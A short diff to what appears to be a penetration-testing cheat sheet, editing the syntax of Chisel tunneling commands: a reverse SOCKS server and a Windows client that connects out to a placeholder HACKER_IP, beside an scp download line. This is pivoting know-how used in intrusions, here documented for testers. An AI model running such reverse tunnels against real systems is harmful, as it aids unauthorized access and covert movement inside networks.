@@ -266,11 +266,11 @@ $ scp <user>@<IP>:/file/to/download /path/to/save
 # Chisel
 Server (Linux):
 ```shell-session
-$ chisel server --reverse --socks5 -p 8001
+$ chisel server [--reverse] [--socks5] -p 8001
 ```
 Client (Windows)
 ```powershell
-> .\chisel.exe client HACKER_IP:PORT R:socks
+> .\chisel.exe client HACKER_IP:PORT R:<socks/PORT>
 ```
 
 Can be used with `curl`:
